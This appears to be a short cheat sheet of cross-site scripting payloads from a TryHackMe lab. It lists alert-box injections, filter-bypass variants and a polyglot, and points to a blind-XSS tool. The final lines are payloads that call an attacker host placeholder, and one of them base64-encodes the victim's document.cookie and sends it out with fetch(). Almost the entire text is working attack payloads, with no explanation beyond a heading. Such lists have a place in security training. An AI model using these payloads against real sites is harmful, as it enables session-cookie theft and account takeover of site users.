
test for blind XSS: https://github.com/mandatoryprogrammer/xsshunter-express

## payloads

- <script>alert('THM');</script>
- "><script>alert('THM');</script>
- </textarea><script>alert('THM');</script>
- ';alert('THM');// 
- <sscriptcript>alert('THM');</sscriptcript>
- /images/cat.jpg" onload="alert('THM');

### Polyglot: 
- jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


</textarea><img src="http://{IP_ADDRESS}:9000" />

</textarea><script>fetch('http://{IP_ADDRESS}:9000')</script>

</textarea><script>fetch('http://{IP_ADDRESS}:9001?cookie=' + btoa(document.cookie) );</script>
